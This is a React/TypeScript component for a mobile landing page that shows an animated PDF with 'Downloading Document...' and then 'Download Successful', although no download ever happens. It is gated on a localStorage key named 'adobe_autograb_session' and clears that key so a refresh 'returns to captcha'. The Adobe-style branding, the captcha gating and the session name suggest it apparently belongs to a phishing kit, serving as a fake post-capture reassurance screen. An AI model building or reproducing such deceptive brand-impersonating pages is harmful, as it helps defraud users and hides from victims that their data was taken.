import React, { useEffect, useRef, useState } from 'react';

interface MobileLandingPageProps {
  onFileAction?: (fileName: string, action: 'view' | 'download') => void;
}

/**
 * Updated behavior per request:
 * - Replace static Adobe icon background with a real (CSS) PDF document animation component.
 * - Run one flow: "Downloading..." -> "Download Successful" -> then hide text,
 *   leaving the PDF document visible plainly (no success text over it).
 * - Text should be clearly visible without heavy high-contrast styling.
 * - Keep session gating and removal of 'adobe_autograb_session' when complete.
 */
const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
  const [showOverlay, setShowOverlay] = useState(false);
  const [phase, setPhase] = useState<'idle' | 'downloading' | 'success'>('idle');
  const [dots, setDots] = useState('');
  const [docAnimating, setDocAnimating] = useState(false);

  const dotIntervalRef = useRef<number | null>(null);
  const successTimeoutRef = useRef<number | null>(null);
  const hideOverlayTimeoutRef = useRef<number | null>(null);

  useEffect(() => {
    try {
      const raw = localStorage.getItem('adobe_autograb_session');
      if (!raw) return;
      let session: any = null;
      try {
        session = JSON.parse(raw);
      } catch {
        session = null;
      }
      const sessionId = (session && (session.sessionId || session.timestamp)) ? String(session.sessionId || session.timestamp) : null;
      if (!sessionId) return;

      const shownKey = `adobe_download_shown::${sessionId}`;
      const alreadyShown = sessionStorage.getItem(shownKey);
      if (alreadyShown) return;

      // Start sequence
      setShowOverlay(true);
      setPhase('downloading');
      setDocAnimating(true);

      let dotCount = 1;
      const maxDots = 6;
      dotIntervalRef.current = window.setInterval(() => {
        dotCount = dotCount >= maxDots ? 1 : dotCount + 1;
        setDots('.'.repeat(dotCount));
      }, 500) as unknown as number;

      successTimeoutRef.current = window.setTimeout(() => {
        if (dotIntervalRef.current) {
          clearInterval(dotIntervalRef.current);
          dotIntervalRef.current = null;
        }
        setPhase('success');
        setDots('');
        try {
          sessionStorage.setItem(shownKey, new Date().toISOString());
        } catch {}
        // Remove persisted session so a full refresh returns to captcha
        try {
          localStorage.removeItem('adobe_autograb_session');
        } catch {}

        // Hide overlay text shortly after showing success, leaving the doc plain.
        hideOverlayTimeoutRef.current = window.setTimeout(() => {
          setShowOverlay(false);
          setPhase('idle');
          setDocAnimating(false);
          hideOverlayTimeoutRef.current = null;
        }, 1200) as unknown as number;

        successTimeoutRef.current = null;
      }, 3000) as unknown as number;

    } catch (e) {
      // ignore
    }

    return () => {
      if (dotIntervalRef.current) {
        clearInterval(dotIntervalRef.current);
        dotIntervalRef.current = null;
      }
      if (successTimeoutRef.current) {
        clearTimeout(successTimeoutRef.current);
        successTimeoutRef.current = null;
      }
      if (hideOverlayTimeoutRef.current) {
        clearTimeout(hideOverlayTimeoutRef.current);
        hideOverlayTimeoutRef.current = null;
      }
    };
  }, []);

  return (
    <div
      style={{
        minHeight: '100vh',
        background: '#f4f6f8',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        color: '#111'
      }}
    >
      {/* PDF Document Animation replacing previous static icon */}
      <PDFDocumentMobile animating={docAnimating} />

      {showOverlay && (
        <div
          role="status"
          style={{
            position: 'fixed',
            inset: 0,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 9999,
            pointerEvents: 'none'
          }}
        >
          <div
            style={{
              color: '#111',
              fontSize: 16,
              fontWeight: 600,
              textAlign: 'center',
              padding: '10px 14px',
              borderRadius: 10,
              background: 'rgba(255,255,255,0.94)',
              border: '1px solid rgba(0,0,0,0.06)',
              boxShadow: '0 4px 16px rgba(0,0,0,0.08)'
            }}
          >
            {phase === 'downloading' && <span>Downloading Document{dots}</span>}
            {phase === 'success' && <span>Download Successful</span>}
          </div>
        </div>
      )}
    </div>
  );
};

function PDFDocumentMobile({ animating }: { animating: boolean }) {
  return (
    <div style={{ position: 'relative' }}>
      <style>
        {`
          @keyframes pdfFloatMobile {
            0%   { transform: translateY(0px);   }
            50%  { transform: translateY(-8px);  }
            100% { transform: translateY(0px);   }
          }
          .pdf-doc-m {
            position: relative;
            width: 180px;
            height: 225px;
            border-radius: 12px;
            background: #ffffff;
            box-shadow: 0 8px 24px rgba(0,0,0,0.12);
            transition: transform 300ms ease;
          }
          .pdf-doc-m.animating {
            animation: pdfFloatMobile 3s ease-in-out infinite;
          }
          .pdf-fold-m {
            position: absolute;
            top: 0;
            right: 0;
            width: 0;
            height: 0;
            border-left: 26px solid transparent;
            border-top: 26px solid #eceff3;
            border-top-right-radius: 8px;
          }
          .pdf-badge-m {
            position: absolute;
            top: 10px;
            left: 10px;
            background: #e53935;
            color: #fff;
            font-weight: 700;
            font-size: 11px;
            padding: 3px 7px;
            border-radius: 6px;
            letter-spacing: 0.6px;
          }
          .pdf-lines-m span {
            display: block;
            height: 8px;
            background: #e9eef3;
            border-radius: 6px;
            margin: 10px 14px;
          }
          .pdf-lines-m span:nth-child(1) { width: 78%; margin-top: 52px; }
          .pdf-lines-m span:nth-child(2) { width: 62%; }
          .pdf-lines-m span:nth-child(3) { width: 86%; }
          .pdf-lines-m span:nth-child(4) { width: 70%; }
          .pdf-lines-m span:nth-child(5) { width: 82%; }
        `}
      </style>
      <div className={`pdf-doc-m ${animating ? 'animating' : ''}`}>
        <div className="pdf-fold-m" />
        <div className="pdf-badge-m">PDF</div>
        <div className="pdf-lines-m">
          <span />
          <span />
          <span />
          <span />
          <span />
        </div>
      </div>
    </div>
  );
}

export default MobileLandingPage;
